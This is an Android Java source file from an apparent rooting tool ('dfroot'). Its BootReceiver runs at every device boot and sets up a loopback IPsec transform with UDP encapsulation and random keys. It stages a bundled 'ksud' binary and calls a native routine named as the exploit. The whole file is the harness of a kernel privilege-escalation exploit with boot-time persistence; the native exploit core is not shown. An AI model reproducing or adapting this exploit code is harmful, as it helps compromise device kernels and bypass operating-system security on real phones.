package df.root;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.util.Log;

import java.io.File;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;

public class BootReceiver extends BroadcastReceiver implements IReporter {
    private static final String TAG = "dfroot";

    @Override
    public void report(String msg) {
        Log.i(TAG, msg.trim());
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (new File("/dev/df").exists()) {
            Log.i(TAG, "boot: already hooked, skipping");
            return;
        }
        Log.i(TAG, "boot: " + intent.getAction());
        final Context deCtx = context.createDeviceProtectedStorageContext();
        new Thread(() -> runExploit(deCtx), "dfroot-boot").start();
    }

    private void runExploit(Context context) {
        try {
            if (!DeviceCheck.preflight("boot")) {
                Log.e(TAG, "boot: preflight failed - aborting before patching anything");
                return;
            }

            IpSecManager ipsec = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);

            IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
            int encapPort = encapSock.getPort();

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            IpSecManager.SecurityParameterIndex spiObj =
                    ipsec.allocateSecurityParameterIndex(loopback);
            int spiVal = spiObj.getSpi();

            SecureRandom rng = new SecureRandom();
            byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
            byte[] hmacKey = new byte[32]; rng.nextBytes(hmacKey);

            IpSecAlgorithm enc  = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
            IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);

            DatagramSocket senderSock = new DatagramSocket();
            int senderPort = senderSock.getLocalPort();
            senderSock.close();

            IpSecTransform transform = new IpSecTransform.Builder(context)
                    .setEncryption(enc)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encapSock, senderPort)
                    .buildTransportModeTransform(loopback, spiObj);

            MainActivity.stageAsset(context, "ksud", true, context.getFilesDir());
            String ksudPath = new File(context.getFilesDir(), "ksud").getAbsolutePath();

            int icvLen = 128 / 8;
            int rc = MainActivity.nativeRunAll(this, encapPort, spiVal,
                    aesKey, hmacKey, icvLen, senderPort, ksudPath, false);
            Log.i(TAG, "boot: exploit rc=" + rc);

            transform.close();
            spiObj.close();
            encapSock.close();

        } catch (Exception e) {
            Log.e(TAG, "boot: exploit exception", e);
        }
    }
}
